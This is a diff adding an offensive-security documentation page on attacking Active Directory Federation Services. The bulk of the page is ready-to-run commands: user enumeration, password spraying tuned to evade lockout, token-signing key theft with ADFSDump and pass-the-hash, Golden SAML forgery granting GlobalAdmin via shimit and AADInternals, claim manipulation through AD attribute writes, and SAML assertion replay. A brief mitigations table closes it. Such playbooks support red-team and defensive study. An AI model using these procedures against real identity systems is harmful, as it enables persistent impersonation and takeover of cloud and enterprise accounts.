@@ -1,0 +1,325 @@
+---
+title: "ADFS"
+---
+
+Active Directory Federation Services (ADFS) provides Single Sign-On (SSO) to external applications via SAML 2.0 and WS-Federation. The token-signing certificate is the crown jewel: its private key allows forging SAML assertions for any user against any relying party, surviving password resets and account disables.
+
+## How ADFS Works
+
+```
+User       →  /adfs/ls  →  ADFS authenticates the user against AD
+ADFS       →  signs a SAML assertion with the token-signing private key
+ADFS       →  redirects the user to the Relying Party with the assertion in the POST body
+Relying Party  →  validates the assertion signature with the public cert
+Relying Party  →  reads claims (NameID, groups, roles) and grants access
+```
+
+Key components:
+
+- **Federation Server**: the ADFS service, typically at `https://adfs.$DOMAIN/adfs/ls`
+- **Token-signing certificate**: private key signs every outbound assertion. Stored in the ADFS configuration database, encrypted via DPAPI under the ADFS service account.
+- **Relying Party Trusts (RPs)**: the service providers (Office 365, Salesforce, internal apps) that trust this ADFS instance
+- **Claim rules**: transforms AD attributes (UPN, groups, extensionAttributes) into SAML claims sent to the RP
+
+---
+
+## Enumeration
+
+### Unauthenticated Discovery
+
+```bash wrap
+# ADFS federation metadata (no auth required, reveals signing cert public key and endpoints)
+curl -s https://adfs.$DOMAIN/FederationMetadata/2007-06/FederationMetadata.xml
+
+# Confirm ADFS is running
+curl -sk https://adfs.$DOMAIN/adfs/ls/ -o /dev/null -w "%{http_code}"
+
+# DNS
+nslookup adfs.$DOMAIN $DC_IP
+```
+
+### Authenticated Enumeration (PowerShell on ADFS server)
+
+```powershell wrap
+# List all relying party trusts
+Get-ADFSRelyingPartyTrust | Select-Object Name, Enabled, Identifier, IssuanceAuthorizationRules
+
+# ADFS global configuration (lockout policy, endpoints)
+Get-ADFSProperties | Select-Object Hostname, TlsClientPort, LockoutEnabled, LockoutThreshold, ExtranetLockoutEnabled
+
+# Token-signing certificate (public key only without DPAPI access)
+Get-ADFSCertificate -CertificateType Token-Signing
+
+# Claim rules per relying party
+Get-ADFSRelyingPartyTrust | ForEach-Object {
+    Write-Host "=== $($_.Name) ===" -ForegroundColor Cyan
+    $_.IssuanceTransformRules
+}
+```
+
+### ADFSDump
+
+ADFSDump extracts the full ADFS configuration including the token-signing private key. Run on the ADFS server with local admin, or supply the ADFS service account credentials.
+
+```powershell wrap
+# On the ADFS server (local admin required)
+.\ADFSDump.exe
+
+# Output:
+#   [*] Token-Signing Certificate: <thumbprint>
+#   [*] Private Key: <base64 PFX>
+#   [*] Relying Parties:
+#       - Microsoft Office 365 Identity Platform
+#       - ...
+#   [*] Claim Rules per RP
+```
+
+```bash wrap
+# Convert the exported PFX to PEM for Python tooling
+openssl pkcs12 -in TokenSigning.pfx -nocerts -nodes -out signing.key
+openssl pkcs12 -in TokenSigning.pfx -clcerts -nokeys -out signing.crt
+```
+
+---
+
+## Credential-Based Attacks
+
+ADFS exposes forms-based authentication at `/adfs/ls`. Crucially, ADFS maintains its own lockout policy separate from AD's fine-grained password policy. Many deployments have no extranet lockout configured, making spraying safe at low volume.
+
+### User Enumeration
+
+ADFS returns distinct responses for valid versus invalid usernames, enabling unauthenticated enumeration before any authentication attempt.
+
+```bash wrap
+# Valid user: response body references password failure
+# Invalid user: response body references username not found or generic error
+curl -sk -X POST 'https://adfs.$DOMAIN/adfs/ls/' \
+  -d "UserName=$DOMAIN\\$USER&Password=invalid&AuthMethod=FormsAuthentication" \
+  | grep -i 'incorrect\|not found\|password'
+```
+
+### Password Spraying
+
+Check lockout settings before spraying. If `ExtranetLockoutEnabled` is false, the threshold is effectively unlimited.
+
+```powershell wrap
+# ADFSSpray
+Invoke-ADFSSpray -Url "https://adfs.$DOMAIN/adfs/ls/" \
+  -UserList users.txt -Password '$PASSWORD' -Domain $DOMAIN
+
+# MSOLSpray (Office 365 / federated domains)
+Invoke-MSOLSpray -UserList users.txt -Password '$PASSWORD'
+```
+
+```bash wrap
+# o365spray (supports ADFS module)
+python3 o365spray.py --spray -U users.txt -p '$PASSWORD' \
+  --domain $DOMAIN --module adfs
+
+# trevorspray
+trevorspray -u users.txt -p '$PASSWORD' --adfs https://adfs.$DOMAIN
+```
+
+Keep spraying intervals above 30 minutes per user. Monitor for 342 or 391 ADFS event IDs in the ADFS event log that indicate lockout activity.
+
+---
+
+## Golden SAML
+
+The most impactful ADFS attack. Once you possess the token-signing private key, you can forge SAML assertions for any user, for any relying party, indefinitely. The forgery is cryptographically valid and indistinguishable from a legitimate assertion.
+
+**Why it is dangerous:**
+- No password required for the impersonated user
+- Survives password resets, account disables, MFA enrollment changes
+- Valid against every SP trusting this ADFS until the cert is rotated
+- Leaves no trace in AD (no logon event against the impersonated account)
+
+### Step 1: Extract the Token-Signing Private Key
+
+The private key is stored in the ADFS configuration database (Windows Internal Database or SQL Server), encrypted with DPAPI under the ADFS service account's master key.
+
+```powershell wrap
+# Option A: On the ADFS server with local admin
+.\ADFSDump.exe
+# Produces TokenSigning.pfx
+
+# Option B: If you have the ADFS service account hash, impersonate it first
+sekurlsa::pth /user:$ADFS_SVC_USER /domain:$DOMAIN /ntlm:$ADFS_SVC_HASH /run:powershell.exe
+# Then run ADFSDump in that context
+.\ADFSDump.exe
+```
+
+```bash wrap
+# Convert PFX to PEM
+openssl pkcs12 -in TokenSigning.pfx -nocerts -nodes -out signing.key -passin pass:
+openssl pkcs12 -in TokenSigning.pfx -clcerts -nokeys -out signing.crt -passin pass:
+```
+
+### Step 2: Identify Target RP and Claims
+
+```powershell wrap
+# Find the RP identifier (Audience URI) and required claims
+Get-ADFSRelyingPartyTrust -Name 'Microsoft Office 365 Identity Platform' |
+  Select-Object Identifier, IssuanceTransformRules
+
+# For a custom app, note the EntityID from its SAML metadata
+curl -s https://$TARGET_SP/saml/metadata | grep -i 'entityID'
+```
+
+### Step 3: Get the Target User's ImmutableID (Azure AD / O365)
+
+For Office 365 / Azure AD federated domains, the assertion NameID must be the user's `ImmutableID` (base64-encoded `objectGUID`).
+
+```powershell wrap
+$user = Get-ADUser -Identity Administrator -Properties ObjectGUID
+[System.Convert]::ToBase64String($user.ObjectGUID.ToByteArray())
+# Output: base64 string — use as the NameID in the forged assertion
+```
+
+### Step 4: Forge and Submit the Assertion
+
+```bash wrap
+# shimit (CyberArk): forge and open the browser session
+python shimit.py \
+  -idp https://adfs.$DOMAIN/adfs/services/trust \
+  -k signing.key \
+  -c signing.crt \
+  -u Administrator@$DOMAIN \
+  -n $IMMUTABLE_ID \
+  -r 'http://schemas.microsoft.com/ws/2008/06/identity/claims/role=GlobalAdmin' \
+  -a 'https://login.microsoftonline.com/'
+```
+
+```powershell wrap
+# AADInternals: Golden SAML directly to Office 365 portal
+$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2("TokenSigning.pfx","")
+$token = New-AADIntSAMLToken `
+  -ImmutableID $IMMUTABLE_ID `
+  -Issuer "http://adfs.$DOMAIN/adfs/services/trust" `
+  -Certificate $cert
+Open-AADIntOffice365Portal -SAMLToken $token
+```
+
+---
+
+## Claim Manipulation
+
+ADFS issues assertions containing claims that SPs use to make authorization decisions. If the SP trusts claims without re-validating them against the directory, controlling the claim value equals controlling access.
+
+### Attack Surface
+
+**AD attribute passthrough:** Claim rules often map AD attributes directly to SAML claims.
+
+```
+# Example claim rule: maps "department" attribute to a role claim
+c:[Type == "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department"]
+ => issue(Type = "http://schemas.xmlsoap.org/ws/2008/06/identity/claims/role", Value = c.Value);
+```
+
+If you can write to the mapped attribute on your own account, you control the claim.
+
+```bash wrap
+# Write to a user-controlled AD attribute that maps to a privileged claim
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set object '$USER' department -v 'Administrators'
+
+# Re-authenticate to ADFS: the forged role claim grants elevated access on the SP
+```
+
+**Overly broad passthrough rules:** Rules of the form `c:[] => issue(claim = c);` pass through every attribute. If the SP grants access based on any of these and you control an attribute, it is a direct escalation path.
+
+**With Golden SAML (no AD write needed):** Forge the assertion with arbitrary claim values directly in the signed XML.
+
+```bash wrap
+# Add arbitrary role claims to the forged assertion
+python shimit.py ... \
+  -r 'http://schemas.xmlsoap.org/ws/2008/06/identity/claims/role=Admin' \
+  -r 'http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress=admin@$DOMAIN'
+```
+
+### Enumeration
+
+```powershell wrap
+# Find passthrough or attribute-based claim rules
+Get-ADFSRelyingPartyTrust | ForEach-Object {
+  $name = $_.Name
+  $_.IssuanceTransformRules -split "`n" | Where-Object { $_ -match 'extensionAttribute|department|title|c:\[\]' } |
+    ForEach-Object { Write-Host "$name : $_" }
+}
+
+# Check which AD attributes are mapped
+Get-ADFSAttributeStore
+Get-ADFSClaimDescription | Select-Object ShortName, ClaimType
+```
+
+---
+
+## SAML Replay Attack
+
+A valid SAML assertion intercepted in transit can be reused within its validity window (typically 1 to 5 minutes). Assertions carry a `NotOnOrAfter` timestamp and a unique `AssertionID`. If the SP does not cache used `AssertionID` values to prevent reuse, the assertion can be replayed to establish a second session.
+
+### Interception Methods
+
+- MitM on the browser redirect (POST binding: assertion is in the POST body, visible in plaintext over HTTP)
+- XSS on the SP or a co-hosted application that leaks the POST body
+- Browser history, proxy logs, or referrer headers containing the base64 assertion
+- Compromised reverse proxy or WAF sitting in front of the SP
+
+### Replay Procedure
+
+```bash wrap
+# Decode a captured SAMLResponse
+echo '$SAML_RESPONSE_BASE64' | base64 -d > assertion.xml
+
+# Inspect validity window and AssertionID
+grep -E 'NotOnOrAfter|NotBefore|AssertionID|ID=' assertion.xml
+
+# Replay to the SP's ACS endpoint within the window
+curl -s -X POST "https://$TARGET_SP/saml/acs" \
+  --data-urlencode "SAMLResponse=$SAML_RESPONSE_BASE64" \
+  --data-urlencode "RelayState=$RELAY_STATE" \
+  -c cookies.txt -b cookies.txt -L
+```
+
+A successful replay returns an authenticated session without any credential input.
+
+### Why SPs Are Vulnerable
+
+- No `AssertionID` cache maintained server-side
+- Validity window wider than 2 minutes (some apps set 10 to 30 minutes)
+- POST binding used without strict transport security (assertion visible in clear)
+- SP accepts redirect binding without verifying the assertion was intended for it (missing `InResponseTo` check)
+
+---
+
+## Mitigations
+
+| Control | Mitigates |
+|---------|-----------|
+| Enable ADFS Extranet Lockout (`ExtranetLockoutEnabled`) | Credential spray |
+| Rotate token-signing certificate | Golden SAML with extracted key |
+| Enable ADFS auditing (Event 1200, 1202, 1203, 1204) | Token issuance visibility |
+| Monitor DPAPI access on ADFS service account | Key extraction detection |
+| SP-side AssertionID cache | Replay attacks |
+| Restrict claim passthrough rules | Claim manipulation |
+| Enforce short assertion validity windows (< 2 min) | Replay attacks |
+| Use Azure AD Smart Lockout for federated tenants | Cloud-side spray detection |
+
+---
+
+## References
+
+<CardGroup cols={2}>
+  <Card title="ADFSDump" icon="github" href="https://github.com/mandiant/ADFSDump">
+    Mandiant tool to extract ADFS token-signing certificates and relying party configuration from a compromised ADFS server
+  </Card>
+  <Card title="shimit (Golden SAML)" icon="github" href="https://github.com/cyberark/shimit">
+    CyberArk tool to forge SAML assertions using a stolen token-signing private key
+  </Card>
+  <Card title="Golden SAML: All Paths Lead to Rome" icon="link" href="https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps">
+    CyberArk's original Golden SAML research
+  </Card>
+  <Card title="AADInternals" icon="github" href="https://github.com/Gerenios/AADInternals">
+    PowerShell toolkit for Azure AD and Office 365 attacks including Golden SAML for federated domains
+  </Card>
+</CardGroup>
